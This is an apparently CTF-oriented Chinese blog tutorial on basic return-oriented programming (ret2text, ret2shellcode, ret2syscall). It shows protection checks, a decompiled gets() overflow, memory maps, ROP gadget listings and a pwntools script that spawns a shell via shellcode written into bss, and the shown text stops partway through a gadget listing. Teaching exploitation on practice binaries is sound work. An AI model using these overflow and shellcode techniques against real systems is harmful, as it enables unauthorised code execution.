

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  
    <meta name="description" content="基本ROPret2text原理：ret2text 即控制程序执行程序本身已有的的代码(.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码(也就是 gadgets)，这就是我们所要说的ROP。这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。 ret2text（ret to">
<meta property="og:type" content="article">
<meta property="og:title" content="基本ROP">
<meta property="og:url" content="http://example.com/2025/02/12/%E5%9F%BA%E6%9C%ACROP/index.html">
<meta property="og:site_name" content="Ginat_USB">
<meta property="og:description" content="基本ROPret2text原理：ret2text 即控制程序执行程序本身已有的的代码(.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码(也就是 gadgets)，这就是我们所要说的ROP。这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。 ret2text（ret to">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/3110f76e0ccc12a6ab1f26904138b18c.png">
<meta property="article:published_time" content="2025-02-12T09:58:01.000Z">
<meta property="article:modified_time" content="2025-02-12T10:04:40.416Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="原创">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://i-blog.csdnimg.cn/blog_migrate/3110f76e0ccc12a6ab1f26904138b18c.png">
  
  
  
  <title>基本ROP - Ginat_USB</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Ginat_USB</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="基本ROP"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-02-12 17:58" pubdate>
          2025年2月12日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          11k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          90 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">基本ROP</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h1><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>ret2text 即控制程序执行程序本身已有的的代码(.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码(也就是 gadgets)，这就是我们所要说的ROP。这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p>
<p>ret2text（ret to text），也就是说我们的利用点在原文件中寻找相对应的代码即可（进程存在危险函数如system(“&#x2F;bin”)或execv(“&#x2F;bin&#x2F;sh”)的片段，可以直接劫持返回地址到目标函数地址上。从而getshell。），控制程序执行程序本身已有的的代码 (.text)。</p>
<h3 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h3><p>开启了NX，栈上无法写入shellcode</p>
<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><h3 id="原理：-1"><a href="#原理：-1" class="headerlink" title="原理："></a>原理：</h3><p>ret2shellcode，即控制程序执行 shellcode代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。说白了，程序中这次没有类似于system(“&#x2F;bin&#x2F;sh”)后门函数，需要自己来填充。</p>
<h3 id="利用前提："><a href="#利用前提：" class="headerlink" title="利用前提："></a>利用前提：</h3><ol>
<li>存在溢出，并且还要能够控制返回地址。</li>
<li>运行时，shellcode 所在的区域要拥有执行权限（NX保护关闭、bss段可执行）</li>
<li>操作系统还需要关闭 ASLR (地址空间布局随机化) 保护 。（或关闭PIE保护）</li>
</ol>
<h3 id="解题步骤："><a href="#解题步骤：" class="headerlink" title="解题步骤："></a>解题步骤：</h3><ul>
<li>先使用cyclic测试出溢出点，构造初步的payload</li>
<li>确定程序中的溢出位，看是否可在bss段传入数据</li>
<li>使用GDB的vmmap查看bss段（一般为用户提交的变量在bss段中）</li>
<li>先发送为shellcode的数据写入到bss段</li>
<li>在将程序溢出到上一步用户提交变量的地址</li>
</ul>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>以ret2shellcode为例</p>
<p>查一下保护，没啥保护，32位程序</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>       <span class="hljs-string">i386-32-little</span><br><span class="hljs-attr">RELRO:</span>      <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>         <span class="hljs-string">NX</span> <span class="hljs-string">unknown</span> <span class="hljs-bullet">-</span> <span class="hljs-string">GNU_STACK</span> <span class="hljs-string">missing</span><br><span class="hljs-attr">PIE:</span>        <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br><span class="hljs-attr">Stack:</span>      <span class="hljs-string">Executable</span><br><span class="hljs-attr">RWX:</span>        <span class="hljs-string">Has</span> <span class="hljs-string">RWX</span> <span class="hljs-string">segments</span><br><span class="hljs-attr">Stripped:</span>   <span class="hljs-literal">No</span><br><span class="hljs-attr">Debuginfo:</span>  <span class="hljs-literal">Yes</span><br></code></pre></td></tr></table></figure>

<p>看一下源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No system for you this time !!!&quot;</span>);<br>  gets(s);<br>  <span class="hljs-built_in">strncpy</span>(buf2, s, <span class="hljs-number">0x64u</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bye bye ~&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>它将s的值复制到了buf2处，而buf2处于bss段，地址为0x0804A080</p>
<p>动态调试一下，看看bss段是否可执行。（无法启动调试就给ubuntu加装32位运行库）</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Start</span>      End        Perm	Name<br><span class="hljs-attribute">0x08048000</span> <span class="hljs-number">0</span>x08049000 r-xp	/home/xyq/BUUCTF/ret2shellcode<br><span class="hljs-attribute">0x08049000</span> <span class="hljs-number">0</span>x0804a000 r-xp	/home/xyq/BUUCTF/ret2shellcode<br><span class="hljs-attribute">0x0804a000</span> <span class="hljs-number">0</span>x0804b000 rwxp	/home/xyq/BUUCTF/ret2shellcode<br><span class="hljs-attribute">0xf7dde000</span> <span class="hljs-number">0</span>xf7fb3000 r-xp	/lib/i386-linux-gnu/libc-<span class="hljs-number">2</span>.<span class="hljs-number">27</span>.so<br><span class="hljs-attribute">0xf7fb3000</span> <span class="hljs-number">0</span>xf7fb4000 ---p	/lib/i386-linux-gnu/libc-<span class="hljs-number">2</span>.<span class="hljs-number">27</span>.so<br><span class="hljs-attribute">0xf7fb4000</span> <span class="hljs-number">0</span>xf7fb6000 r-xp	/lib/i386-linux-gnu/libc-<span class="hljs-number">2</span>.<span class="hljs-number">27</span>.so<br><span class="hljs-attribute">0xf7fb6000</span> <span class="hljs-number">0</span>xf7fb7000 rwxp	/lib/i386-linux-gnu/libc-<span class="hljs-number">2</span>.<span class="hljs-number">27</span>.so<br><span class="hljs-attribute">0xf7fb7000</span> <span class="hljs-number">0</span>xf7fba000 rwxp	mapped<br><span class="hljs-attribute">0xf7fcf000</span> <span class="hljs-number">0</span>xf7fd1000 rwxp	mapped<br><span class="hljs-attribute">0xf7fd1000</span> <span class="hljs-number">0</span>xf7fd4000 r--p<span class="hljs-meta">	[vvar]</span><br><span class="hljs-attribute">0xf7fd4000</span> <span class="hljs-number">0</span>xf7fd6000 r-xp<span class="hljs-meta">	[vdso]</span><br><span class="hljs-attribute">0xf7fd6000</span> <span class="hljs-number">0</span>xf7ffc000 r-xp	/lib/i386-linux-gnu/ld-<span class="hljs-number">2</span>.<span class="hljs-number">27</span>.so<br><span class="hljs-attribute">0xf7ffc000</span> <span class="hljs-number">0</span>xf7ffd000 r-xp	/lib/i386-linux-gnu/ld-<span class="hljs-number">2</span>.<span class="hljs-number">27</span>.so<br><span class="hljs-attribute">0xf7ffd000</span> <span class="hljs-number">0</span>xf7ffe000 rwxp	/lib/i386-linux-gnu/ld-<span class="hljs-number">2</span>.<span class="hljs-number">27</span>.so<br><span class="hljs-attribute">0xfffdd000</span> <span class="hljs-number">0</span>xffffe000 rwxp<span class="hljs-meta">	[stack]</span><br></code></pre></td></tr></table></figure>

<p>这就是这个程序的虚拟内存，我们可以看到0x0804A080处于0x0804a000 0x0804b000之间，说明那里就是bss段，同时，这里的bss段是可执行的。</p>
<p>构造一个长一点的字符串手动测量main的栈的长度，为112字节</p>
<p>然后我们就可以构造exp了，具体示例如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2shellcode&#x27;</span>)<br>shellcode  = asm(shellcraft.sh())<br>buf2_addr = <span class="hljs-number">0x804a080</span><br><br>sh.sendline(shellcode.ljust(<span class="hljs-number">112</span>,<span class="hljs-string">b&#x27;A&#x27;</span>) + p32(buf2_addr))<br>sh.interactive()<br></code></pre></td></tr></table></figure>

<p>其中，shellcraft.sh()就相当于执行了system(‘&#x2F;bin&#x2F;sh’)或evecve(‘&#x2F;bin&#x2F;sh’)<br>shellcode.ljust(112, ‘A’)的重点在于ljust(112, ‘A’)，我们知道shellcode是一个字符型，而ljust() 方法返回一个原字符串左对齐,并使用空格填充至指定长度的新字符串。如果指定的长度小于原字符串的长度则返回原字符串。语法为<code>str.ljust(width[, fillchar])</code>，其中width – 指定字符串长度。fillchar – 填充字符，默认为空格。</p>
<h2 id="ret2syscall（32位ELF）"><a href="#ret2syscall（32位ELF）" class="headerlink" title="ret2syscall（32位ELF）"></a>ret2syscall（32位ELF）</h2><h3 id="原理：-2"><a href="#原理：-2" class="headerlink" title="原理："></a>原理：</h3><p>顾名思义，ret to syscall，就是调用系统函数以达到getshell的目的<br>在计算中，系统调用是一种编程方式，计算机程序从该程序中向执行其的操作系统内核请求服务。这可能包括与硬件相关的服务（例如，访问硬盘驱动器），创建和执行新进程以及与诸如进程调度之类的集成内核服务进行通信。系统调用提供了进程与操作系统之间的基本接口。<br>至于系统调用在其中充当什么角色，稍后再看，现在我们要做的是：让程序调用<strong>execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)函数即可拿到shell</strong> </p>
<h3 id="传参方式"><a href="#传参方式" class="headerlink" title="传参方式"></a>传参方式</h3><h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h4><ol>
<li>首先将系统调用号 传入 <code>eax</code></li>
<li>然后将参数 从左到右 依次存入 <code>ebx</code>，<code>ecx</code>，<code>edx</code>寄存器中</li>
<li>回值存在<code>eax</code>寄存器</li>
</ol>
<h4 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h4><ol>
<li>首先将系统调用号 传入 <code>rax</code></li>
<li>然后将参数 从左到右 依次存入<code>rdi</code>，<code>rsi</code>，<code>rdx</code>寄存器中</li>
<li>返回值存在<code>rax</code>寄存器</li>
</ol>
<h3 id="常见的系统调用号"><a href="#常见的系统调用号" class="headerlink" title="常见的系统调用号"></a>常见的系统调用号</h3><h4 id="32位-1"><a href="#32位-1" class="headerlink" title="32位"></a>32位</h4><table>
<thead>
<tr>
<th>syscall</th>
<th>%eax</th>
<th>%ebx(arg0)</th>
<th>%ecx(arg1)</th>
<th>%edx(arg2)</th>
</tr>
</thead>
<tbody><tr>
<td>read</td>
<td>0x03</td>
<td>unsigned int fd</td>
<td>char *buf</td>
<td>size_t count</td>
</tr>
<tr>
<td>write</td>
<td>0x04</td>
<td>unsigned int fd</td>
<td>const char *buf</td>
<td>size_t count</td>
</tr>
<tr>
<td>execve</td>
<td>0x0b</td>
<td>const char *filename</td>
<td>const char *const *argv</td>
<td>const char *const *envp</td>
</tr>
</tbody></table>
<h4 id="64位-1"><a href="#64位-1" class="headerlink" title="64位"></a>64位</h4><table>
<thead>
<tr>
<th>syscall</th>
<th>%eax</th>
<th>%ebx(arg0)</th>
<th>%ecx(arg1)</th>
<th>%edx(arg2)</th>
</tr>
</thead>
<tbody><tr>
<td>sys_read</td>
<td>0x0</td>
<td>unsigned int fd</td>
<td>char *buf</td>
<td>size_t count</td>
</tr>
<tr>
<td>sys_write</td>
<td>0x1</td>
<td>unsigned int fd</td>
<td>const char *buf</td>
<td>size_t count</td>
</tr>
<tr>
<td>sys_execve</td>
<td>0x3B</td>
<td>const char *filename</td>
<td>const char *const argv[]</td>
<td>const char *const envp[]</td>
</tr>
</tbody></table>
<h3 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h3><p>调用此函数的具体的步骤是这样的：因为该程序是 32 位，所以：</p>
<p>eax 应该为 0xb<br>ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以<br>ecx 应该为 0<br>edx 应该为 0<br>最后再执行int 0x80触发中断即可执行execve()获取shell</p>
<p>这么写的原因是：</p>
<p>系统在运行的时候会使用上面四个寄存器，所以那么上面内容我们可以写为int 0x80(eax,ebx,ecx,edx)。只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们再执行 int 0x80 就可执行对应的系统调用。</p>
<p>在我们最开始学习汇编函数的时候，我们最常用到的就是push，pop，ret指令，而这一次我们将使用pop和ret的组合来控制寄存器的值以及执行方向。例如：在一个栈上，假设栈顶的值为2，当我们pop eax,时，2就会存进eax寄存器。同样的，我们可以用同样的方法完成execve()函数参数的控制</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">pop</span> <span class="hljs-built_in">eax</span># 系统调用号载入， execve为<span class="hljs-number">0xb</span><br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span># 第一个参数， /bin/sh的string<br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">ecx</span># 第二个参数，<span class="hljs-number">0</span> 空指针，没有意义<br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">edx</span># 第三个参数，<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>

<p><strong>补充：</strong>在 64 位系统中，通过syscall指令实现系统调用，系统调用号放在RAX寄存器中，参数放置在RDI、RSI、RDX、R10、R8和R9等寄存器中。</p>
<h3 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h3><p>以rop为例</p>
<p>查一下保护，开启了NX保护了，不能使用ret2shellcode</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">Arch:       i386-32-little<br>RELRO:      Partial RELRO<br>Stack:      No canary found<br>NX:         NX enabled<br>PIE:        No PIE (0x8048000)<br>Stripped:   No<br>Debuginfo:  Yes<br></code></pre></td></tr></table></figure>

<p>手动的测量栈的长度，位112字节</p>
<p>之后，我们要用gadgets来获取shell，而对应的 shell 获取则是利用系统调用</p>
<hr>
<p><strong>补充：</strong>gadgets</p>
<p>“Gadgets”  通常是指一系列可以被攻击者利用的机器码指令序列。在漏洞利用场景中，特别是在基于栈溢出或堆溢出等内存破坏漏洞利用时，攻击者会寻找程序中已经存在的代码片段（即 gadgets），这些代码片段可以帮助他们实现一些特定的操作，如修改控制流、读写内存等。</p>
<hr>
<p>在这里，我们要利用execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)系统调用来获取 shell。</p>
<p>而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。具体寻找 gadgets的方法，我们可以使用 ropgadgets 这个工具。工具的具体使用在<code>ropgadgets.md</code></p>
<p>首先，我们来寻找控制 eax 的gadgets：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0x0809ddda</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">eax</span> <span class="hljs-comment">; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="hljs-number">0x080bb196</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">eax</span> <span class="hljs-comment">; ret</span><br><span class="hljs-number">0x0807217a</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">eax</span> <span class="hljs-comment">; ret 0x80e</span><br><span class="hljs-number">0x0804f704</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">eax</span> <span class="hljs-comment">; ret 3</span><br><span class="hljs-number">0x0809ddd9</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">es</span> <span class="hljs-comment">; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></code></pre></td></tr></table></figure>

<p>可以看到有上述几个都可以控制 eax，我选取第二个来作为 gadgets。<br>类似的，我们可以得到控制其它寄存器的 gadgets</p>
<p>ebx：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0x0809dde2</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ds</span> <span class="hljs-comment">; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="hljs-number">0x0809ddda</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">eax</span> <span class="hljs-comment">; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="hljs-number">0x0805b6ed</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebp</span> <span class="hljs-comment">; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="hljs-number">0x0809e1d4</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span> <span class="hljs-comment">; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="hljs-number">0x080be23f</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span> <span class="hljs-comment">; pop edi ; ret</span><br><span class="hljs-number">0x0806eb69</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span> <span class="hljs-comment">; pop edx ; ret</span><br><span class="hljs-number">0x08092258</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span> <span class="hljs-comment">; pop esi ; pop ebp ; ret</span><br><span class="hljs-number">0x0804838b</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span> <span class="hljs-comment">; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="hljs-number">0x080a9a42</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span> <span class="hljs-comment">; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="hljs-number">0x08096a26</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span> <span class="hljs-comment">; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="hljs-number">0x08070d73</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span> <span class="hljs-comment">; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="hljs-number">0x08048547</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span> <span class="hljs-comment">; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="hljs-number">0x08049bfd</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span> <span class="hljs-comment">; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="hljs-number">0x08048913</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span> <span class="hljs-comment">; pop esi ; pop edi ; ret</span><br><span class="hljs-number">0x08049a19</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span> <span class="hljs-comment">; pop esi ; pop edi ; ret 4</span><br><span class="hljs-number">0x08049a94</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span> <span class="hljs-comment">; pop esi ; ret</span><br><span class="hljs-number">0x080481c9</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span> <span class="hljs-comment">; ret</span><br><span class="hljs-number">0x080d7d3c</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span> <span class="hljs-comment">; ret 0x6f9</span><br><span class="hljs-number">0x08099c87</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span> <span class="hljs-comment">; ret 8</span><br><span class="hljs-number">0x0806eb91</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ecx</span> <span class="hljs-comment">; pop ebx ; ret</span><br><span class="hljs-number">0x0806336b</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">edi</span> <span class="hljs-comment">; pop esi ; pop ebx ; ret</span><br><span class="hljs-number">0x0806eb90</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">edx</span> <span class="hljs-comment">; pop ecx ; pop ebx ; ret</span><br><span class="hljs-number">0x0809ddd9</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">es</span> <span 